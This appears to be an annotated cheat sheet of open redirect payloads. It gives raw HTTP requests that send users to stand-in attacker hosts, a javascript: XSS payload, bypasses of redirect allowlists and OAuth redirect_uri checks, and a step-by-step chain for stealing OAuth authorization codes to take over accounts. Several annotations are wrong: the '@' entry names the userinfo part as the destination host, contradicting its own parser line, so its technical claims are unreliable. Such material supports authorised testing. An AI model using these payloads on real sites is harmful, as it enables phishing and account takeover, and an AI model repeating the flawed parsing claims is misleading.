# Open Redirect — Annotated Examples

## Basic Tests

### Direct external redirect
```
GET /login?next=https://evil.example.com/ HTTP/1.1
Host: target.com
```
Response if vulnerable:
```
HTTP/1.1 302 Found
Location: https://evil.example.com/
```

### Scheme-relative URL
```
GET /auth?return=//evil.example.com/ HTTP/1.1
```
Browser follows: inherits current scheme (https://evil.example.com/).

### javascript: protocol (XSS via redirect)
```
GET /logout?returnTo=javascript:alert(1)
```
If `Location: javascript:alert(1)` and browser auto-follows → XSS.

## @ Authority Confusion

### @ trick — evil.com is real host
```
GET /redirect?url=https://evil.example.com@target.com/
```
URL parser: scheme=https, userinfo=evil.example.com, host=target.com
Browser actually navigates to: evil.example.com

### Encoded @ bypass
```
GET /redirect?url=https://evil.example.com%40target.com/
```
Application decodes %40 → @, then redirects to evil.example.com.

### Fragment + @ combo
```
GET /redirect?url=https://target.com#@evil.example.com/
```
Some parsers: host=target.com (looks valid), browser: host=evil.example.com.

## Subdomain Lookalike

### Domain appended to attacker domain (common pattern)
```
GET /sso?redirect=https://target.com.evil-site.com/steal
```
If allowlist only checks `startsWith("https://target.com")` → bypassed.

### Subdomain of target (if attacker controls)
```
GET /redirect?to=https://attacker.target.com/
```
If attacker controls DNS for `attacker.target.com` → redirects there.

## OAuth redirect_uri Bypass

### Subdomain trick
```
GET /oauth/authorize?client_id=APP&redirect_uri=https://legit-app.com.evil.com/cb HTTP/1.1
```
If server only checks `includes("legit-app.com")` → bypassed.

### Path traversal in redirect_uri
```
GET /oauth/authorize?client_id=APP&redirect_uri=https://legit-app.com/callback/../../../?q=evil.com HTTP/1.1
```

### @ trick in redirect_uri
```
GET /oauth/authorize?client_id=APP&redirect_uri=https://legit-app.com@evil.com/steal HTTP/1.1
```
If accepted: auth code is sent to evil.com → account takeover.

## Backslash Confusion

### Chrome/Firefox treat \ as path separator
```
GET /redirect?to=https://evil.example.com\target.com/
```
Browser navigates to: evil.example.com/target.com/ (\ treated as path, host=evil.example.com).

### Server-side and client-side mismatch
```
GET /redirect?url=https://target.com\@evil.example.com/
Server validator sees: target.com (valid)
Browser navigates to: evil.example.com
```

## Chained Attack Scenario

### Open redirect → OAuth token theft
```
1. Attacker finds: GET /oauth/authorize?...&redirect_uri=BYPASS allows redirect to evil.com
2. Craft URL: https://target.com/oauth/authorize?client_id=official&redirect_uri=https://evil.com/steal
3. Victim visits crafted URL, approves OAuth (or already approved)
4. Browser redirected to: https://evil.com/steal?code=AUTH_CODE
5. Attacker exchanges auth code for access token → account takeover
```
